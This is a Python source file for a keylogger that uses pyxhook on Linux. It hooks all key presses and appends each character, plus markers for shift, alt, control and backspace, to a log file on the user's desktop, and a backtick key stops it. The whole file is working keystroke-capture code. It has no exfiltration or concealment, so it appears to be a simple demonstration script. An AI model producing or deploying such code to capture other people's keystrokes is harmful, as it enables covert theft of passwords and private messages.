import os 
import pyxhook

log_file = os.path.expanduser("~/Desktop/file.log")

#kill switch
cancel_key = ord('`') 

# clearing the log file on start
if os.path.exists(log_file): 
 try: 
  os.remove(log_file) 
 except OSError as e: 
  with open(log_file, 'a') as f: 
   f.write("\n{}".format(e))


#creating key pressing event and saving it into log file 
def OnKeyPress(event):
 if event.Ascii == cancel_key:
  new_hook.cancel()
 
 elif event.Ascii == 8:  # Check if Backspace key is pressed
  with open(log_file, 'a', encoding='utf-8') as f: 
    f.write('<backspace>') 
    
# Check if Shift key is pressed
 elif event.Key == 'Shift_L' or event.Key == 'Shift_R':  
  with open(log_file, 'a', encoding='utf-8') as f: 
    f.write('<shift>')

# Check if Alt key is pressed
 elif event.Key == 'Alt_L' or event.Key == 'Alt_R':  
  with open(log_file, 'a',encoding='utf-8') as f: 
    f.write('<alt>') 

# Check if Control key is pressed
 elif event.Key == 'Control_L' or event.Key == 'Control_R':  
    with open(log_file, 'a',encoding='utf-8') as f: 
     f.write('<control>')
 
 else: 
  with open(log_file, 'a', encoding='utf-8') as f: 
   f.write(chr(event.Ascii)) 

# create a hook manager object
new_hook = pyxhook.HookManager()  
new_hook.KeyDown = OnKeyPress

# set the hook 
new_hook.HookKeyboard() 
try: 
	new_hook.start()		 # start the hook 
except KeyboardInterrupt: 
	# User cancelled from command line. 
	pass
except Exception as ex:  
	msg = "Error while catching events:\n{}".format(ex) 
	with open(log_file, 'a') as f: 
		f.write("\n{}".format(msg)) 